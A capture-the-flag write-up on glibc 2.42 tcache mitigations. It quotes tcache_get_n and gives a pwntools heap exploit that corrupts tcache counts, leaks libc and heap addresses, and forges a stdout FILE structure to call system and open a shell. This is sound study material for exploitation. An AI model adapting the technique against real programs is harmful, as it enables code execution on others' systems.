# New Mitagations
Nice challenge that showcase teh new protections introduced in glibc 2.42, but no count on lenght? or count check?

```c
/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  Removes chunk from the middle of the
   list.  */
static __always_inline void *
tcache_get_n (size_t tc_idx, tcache_entry **ep, bool mangled)
{
  tcache_entry *e;
  if (!mangled)
    e = *ep;
  else
    e = REVEAL_PTR (*ep);

  if (__glibc_unlikely (misaligned_mem (e)))
    malloc_printerr ("malloc(): unaligned tcache chunk detected");

  void *ne = e == NULL ? NULL : REVEAL_PTR (e->next);
  if (!mangled)
    *ep = ne;
  else
    *ep = PROTECT_PTR (ep, ne);

  ++(tcache->num_slots[tc_idx]);
  e->key = 0;
  return (void *) e;
}```



Exploit (liitleflower):

```python
#!/usr/bin/env python3

import subprocess
import sys

from pwn import *

proc = "./chal_patched"
context.log_level = "debug"
context.binary = proc
elf = ELF(proc, checksec=False)
libc = ELF("./libc.so.6", checksec=False)


r = process(proc)

if args.G:
    attach_running_proc()

# pid=$(ps -avx | awk '/chal_/ && !/awk/ && !/grep/ {print $1; exit}'); [ -n "$pid" ] && gef ./chal_patched -p "$pid"

def choose(idx):
    r.sendlineafter(b"> ", str(idx).encode())


def add(idx, size, data):
    choose(1)
    r.sendlineafter(b"idx?: ", str(idx).encode())
    r.sendlineafter(b"size?: ", str(size).encode())
    r.sendlineafter(b"data?: ", data)


def show(idx):
    choose(2)
    r.sendlineafter(b"idx?: ", str(idx).encode())
    r.recvuntil(b"meow: ")


def delete(idx):
    choose(3)
    r.sendlineafter(b"idx?: ", str(idx).encode())


def edit(idx, data):
    choose(4)
    r.sendlineafter(b"idx?: ", str(idx).encode())
    r.sendlineafter(b"data?: ", data)


# $rebase(0x4050)
add(0, 0x510, b"largebin A")
delete(0)
add(1, 0xe0, b"victim")
edit(0, p64(0x0007000700070007) * 3 + p64(0x0007000700010007) + p64(0x0007000700070007) * 7 + p64(0x0007000000070007))
delete(1)
delete(0)
show(0)
libc_addr = u64(r.recv(8)) - 0x211e10
log.info(f"libc_addr => {hex(libc_addr)}")
stderr = libc_addr + libc.sym['_IO_2_1_stdout_']
r.recv(8 * 31)
heap_base = u64(r.recv(8)) - 0x310
log.info(f"heap_base => {hex(heap_base)}")

edit(0, p64(0) * 32 + p64(stderr))

libc.address = libc_addr

target = libc.sym['system']
fake_IO_addr = libc.sym["_IO_2_1_stdout_"]  
fakeio = flat({
    0: b"  sh;",
    0x20: 0,
    0x28: 1,
    0x68: target,  # chain
    0x88: libc.bss(0x500),  # libc.sym['_IO_stdfile_2_lock'],
    0x98: fake_IO_addr,  # _codecvt = wide_data -> vtable
    0xa0: fake_IO_addr - 0x48,  # _wide_data
    0xd8: libc.sym['_IO_wfile_jumps']
}, filler=b"\x00")

add(0, 0xe0, fakeio)
r.interactive()
```